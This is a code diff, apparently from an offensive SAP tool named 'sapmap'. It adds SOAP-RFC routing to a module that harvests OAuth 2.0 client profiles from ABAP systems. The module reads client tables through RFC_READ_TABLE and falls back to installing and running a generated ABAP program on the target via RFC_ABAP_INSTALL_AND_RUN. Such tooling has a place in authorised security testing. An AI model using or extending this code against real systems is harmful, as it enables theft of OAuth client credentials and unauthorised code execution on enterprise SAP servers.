@@ -101,29 +101,65 @@ def _pick(row: dict, hint_tuple: tuple) -> str:
     return ""
 
 
+def _oa2c_read_table(node, table: str, fields,
+                      creds, max_rows: int,
+                      soap_session=None,
+                      long_strings: bool = False) -> tuple:
+    """Single dispatcher for every RFC_READ_TABLE call in this module.
+    Routes to soap_session.read_table when supplied, pyrfc otherwise.
+    Returns (rows, error_str) — same contract as the original
+    _read_table_all_columns inline tries used.
+
+    Phase 3b: lets the OA2C harvest run on HTTP-only ABAP targets
+    without 60s pyrfc-on-3340 hangs per probed table variant.  The
+    long_strings flag is honoured on the pyrfc path; the SOAP path
+    ignores it because SOAPRFCSession.read_table always uses DATA
+    (USE_ET_DATA_4_RETURN isn't yet wired into the envelope).  In
+    practice the SOAP path is used as a last resort on HTTP-only
+    targets — STRING-column truncation matters less than the harvest
+    not running at all.
+    """
+    if soap_session is not None:
+        try:
+            r = soap_session.read_table(
+                table, fields=list(fields) if fields else None,
+                max_rows=max_rows or 0)
+            if r.get("ok"):
+                return r.get("rows", []), ""
+            return [], (r.get("error") or "")[:200]
+        except Exception as e:
+            return [], f"{type(e).__name__}: {e}"[:200]
+    import sapmap_rfc
+    from sapmap_errors import format_rfc_exception
+    try:
+        rows = sapmap_rfc.read_table(
+            node, table, fields=fields, creds=creds,
+            max_rows=max_rows, long_strings=long_strings) or []
+        return rows, ""
+    except Exception as e:
+        return [], format_rfc_exception(e)[:200]
+
+
 def _read_table_all_columns(node: SAPNode, table: str,
-                              creds: Optional[Credentials]) -> tuple:
-    """Read every column of `table` via sapmap_rfc.read_table without
-    pre-listing fields, so kernel-specific column-name drift can't
-    cause a RFC_READ_TABLE / AD718 hard failure.
+                              creds: Optional[Credentials],
+                              soap_session=None) -> tuple:
+    """Read every column of `table` without pre-listing fields, so
+    kernel-specific column-name drift can't cause a RFC_READ_TABLE /
+    AD718 hard failure.
 
     Returns ``(rows, error_str)``.  An empty `rows` list with empty
     error means the table genuinely has no data; populated `error`
     means the call itself raised (auth missing, table doesn't exist,
     etc.) so the caller can fall through to the next table variant.
     """
-    import sapmap_rfc
-    from sapmap_errors import format_rfc_exception
-    try:
-        rows = sapmap_rfc.read_table(node, table, fields=None,
-                                       creds=creds, max_rows=500) or []
-        return rows, ""
-    except Exception as e:
-        return [], format_rfc_exception(e)[:200]
+    return _oa2c_read_table(
+        node, table, fields=None, creds=creds, max_rows=500,
+        soap_session=soap_session)
 
 
 def _try_read_first_populated(node: SAPNode, table_variants: tuple,
-                                 creds: Optional[Credentials]) -> tuple:
+                                 creds: Optional[Credentials],
+                                 soap_session=None) -> tuple:
     """Probe each `table_variants` candidate in order; the first one
     that returns ≥1 row wins.  Returns ``(table_name, rows)``.
 
@@ -135,7 +171,8 @@ def _try_read_first_populated(node: SAPNode, table_variants: tuple,
     last_error = ""
     for tbl in table_variants:
         print(f"[*] {node.sid}: probing {tbl} (all columns)…")
-        rows, err = _read_table_all_columns(node, tbl, creds)
+        rows, err = _read_table_all_columns(
+            node, tbl, creds, soap_session=soap_session)
         if err:
             print(f"[-] {node.sid}: {tbl} read failed — {err}")
             last_error = err
@@ -190,7 +227,8 @@ def _reread_with_explicit_columns(node: SAPNode, table: str,
                                      columns: list,
                                      creds: Optional[Credentials],
                                      *,
-                                     long_strings: bool = False) -> list:
+                                     long_strings: bool = False,
+                                     soap_session=None) -> list:
     """Re-issue RFC_READ_TABLE asking ONLY for the named columns.
 
     When ``long_strings`` is True, sets ``USE_ET_DATA_4_RETURN='X'``
@@ -201,28 +239,27 @@ def _reread_with_explicit_columns(node: SAPNode, table: str,
     """
     if not columns:
         return []
-    import sapmap_rfc
-    from sapmap_errors import format_rfc_exception
     label = "long-strings re-read" if long_strings else "targeted re-read"
-    try:
-        rows = sapmap_rfc.read_table(node, table, fields=list(columns),
-                                       creds=creds, max_rows=500,
-                                       long_strings=long_strings) or []
-        print(f"[+] {node.sid}: {table} {label} with "
-              f"{len(columns)} explicit column(s) → {len(rows)} "
-              f"row(s)"
-              + (" (ET_DATA path; STRING columns now populated)"
-                 if long_strings else ""))
-        return rows
-    except Exception as e:
+    rows, err = _oa2c_read_table(
+        node, table, fields=list(columns), creds=creds,
+        max_rows=500, soap_session=soap_session,
+        long_strings=long_strings)
+    if err:
         print(f"[-] {node.sid}: {table} {label} failed — "
-              f"{format_rfc_exception(e)[:160]}.")
+              f"{err[:160]}.")
         return []
+    print(f"[+] {node.sid}: {table} {label} with "
+          f"{len(columns)} explicit column(s) → {len(rows)} "
+          f"row(s)"
+          + (" (ET_DATA path; STRING columns now populated)"
+             if long_strings else ""))
+    return rows
 
 
 def _read_via_abap_fallback(node: SAPNode, table: str,
                               columns: list,
-                              creds: Optional[Credentials]) -> list:
+                              creds: Optional[Credentials],
+                              soap_session=None) -> list:
     """RFC_READ_TABLE silently omits STRING / RAWSTRING / XSTRING
     columns from its result — it can only marshal fixed-length CHAR
     types into the workarea.  S/4 OA2C_CLIENT stores CLIENT_ID,
@@ -265,13 +302,20 @@ def _read_via_abap_fallback(node: SAPNode, table: str,
     abap.append("ENDLOOP.")
 
     try:
-        with sapmap_rfc._get_connection(node, creds) as conn:
+        if soap_session is not None:
             print(f"[*] {node.sid}: STRING-typed columns omitted by "
                   f"RFC_READ_TABLE — falling back to "
-                  f"RFC_ABAP_INSTALL_AND_RUN to read {table} "
-                  f"({len(columns)} columns) directly.")
-            run = sapmap_rfc._run_abap_program(conn, abap,
-                                                 "ZSAPMAP_OA2C")
+                  f"RFC_ABAP_INSTALL_AND_RUN (over SOAP-RFC) to read "
+                  f"{table} ({len(columns)} columns) directly.")
+            run = soap_session.install_and_run(abap, "ZSAPMAP_OA2C")
+        else:
+            with sapmap_rfc._get_connection(node, creds) as conn:
+                print(f"[*] {node.sid}: STRING-typed columns omitted "
+                      f"by RFC_READ_TABLE — falling back to "
+                      f"RFC_ABAP_INSTALL_AND_RUN to read {table} "
+                      f"({len(columns)} columns) directly.")
+                run = sapmap_rfc._run_abap_program(
+                    conn, abap, "ZSAPMAP_OA2C")
     except Exception as e:
         from sapmap_errors import format_rfc_exception
         print(f"[-] {node.sid}: ABAP fallback could not establish RFC "
@@ -307,7 +351,8 @@ def _read_via_abap_fallback(node: SAPNode, table: str,
 
 
 def read_oa2c_profiles(node: SAPNode,
-                        creds: Optional[Credentials] = None) -> list:
+                        creds: Optional[Credentials] = None,
+                        soap_session=None) -> list:
     """Pull every OAuth 2.0 Client profile configured on the ABAP
     target and join the rows the BTP harvester needs into one
     flat structure.
@@ -337,23 +382,34 @@ def read_oa2c_profiles(node: SAPNode,
     import sapmap_rfc
     table = ""
     columns: list = []
-    for tbl in _CLIENT_TABLE_VARIANTS:
-        cols = sapmap_rfc.get_table_columns(node, tbl, creds=creds)
-        if cols:
-            print(f"[+] {node.sid}: DDIF says {tbl} has "
-                  f"{len(cols)} column(s): {', '.join(cols)}")
-            table = tbl
-            columns = cols
-            break
-        print(f"[*] {node.sid}: DDIF returned no columns for {tbl} "
-              f"(table doesn't exist on this kernel)")
+    # DDIF_FIELDINFO_GET goes via pyrfc — when the gateway is
+    # unreachable (HTTP-only target), skip it and fall straight
+    # through to the SOAP-routed all-columns probe.  Avoids a 60s
+    # hang per table variant on firewalled targets.
+    if soap_session is None:
+        for tbl in _CLIENT_TABLE_VARIANTS:
+            cols = sapmap_rfc.get_table_columns(node, tbl, creds=creds)
+            if cols:
+                print(f"[+] {node.sid}: DDIF says {tbl} has "
+                      f"{len(cols)} column(s): {', '.join(cols)}")
+                table = tbl
+                columns = cols
+                break
+            print(f"[*] {node.sid}: DDIF returned no columns for {tbl}"
+                  f" (table doesn't exist on this kernel)")
+    else:
+        print(f"[*] {node.sid}: gateway down — skipping pyrfc DDIF "
+              f"discovery, going straight to SOAP-routed all-columns "
+              f"probe")
     if not table:
-        print(f"[-] {node.sid}: DDIF discovery failed across "
-              f"{', '.join(_CLIENT_TABLE_VARIANTS)} — falling back "
-              f"to RFC_READ_TABLE all-columns probe (may miss "
-              f"columns past the 512-byte WA cut-off)")
+        if soap_session is None:
+            print(f"[-] {node.sid}: DDIF discovery failed across "
+                  f"{', '.join(_CLIENT_TABLE_VARIANTS)} — falling back "
+                  f"to RFC_READ_TABLE all-columns probe (may miss "
+                  f"columns past the 512-byte WA cut-off)")
         table, fallback_rows = _try_read_first_populated(
-            node, _CLIENT_TABLE_VARIANTS, creds)
+            node, _CLIENT_TABLE_VARIANTS, creds,
+            soap_session=soap_session)
         if not fallback_rows:
             print(f"[*] {node.sid}: no OAuth client config visible "
                   f"across {', '.join(_CLIENT_TABLE_VARIANTS)}")
@@ -385,7 +441,8 @@ def read_oa2c_profiles(node: SAPNode,
           f"{targeted_cols} via RFC_READ_TABLE with "
           f"USE_ET_DATA_4_RETURN='X' (long-string path)…")
     clients = _reread_with_explicit_columns(
-        node, table, targeted_cols, creds, long_strings=True)
+        node, table, targeted_cols, creds, long_strings=True,
+        soap_session=soap_session)
     if not clients:
         print(f"[*] {node.sid}: {table} returned 0 rows — table "
               f"exists but has no OAuth profiles configured")
@@ -417,7 +474,8 @@ def read_oa2c_profiles(node: SAPNode,
         print(f"[*] {node.sid}: {reason}.  Trying "
               f"RFC_ABAP_INSTALL_AND_RUN fallback…")
         abap_rows = _read_via_abap_fallback(
-            node, table, targeted_cols, creds)
+            node, table, targeted_cols, creds,
+            soap_session=soap_session)
         if abap_rows:
             clients = abap_rows
         else:
@@ -430,7 +488,8 @@ def read_oa2c_profiles(node: SAPNode,
     print(f"[*] {node.sid}: looking up grant types in "
           f"{', '.join(_CLIENT_EXT_TABLE_VARIANTS)}…")
     _ext_table, ext_rows = _try_read_first_populated(
-        node, _CLIENT_EXT_TABLE_VARIANTS, creds)
+        node, _CLIENT_EXT_TABLE_VARIANTS, creds,
+        soap_session=soap_session)
     grant_by_uuid: dict = {}
     for r in ext_rows:
         uuid = _normalise_uuid(_pick(r, ("CLIENT_UUID", "CONFIG_ID")))
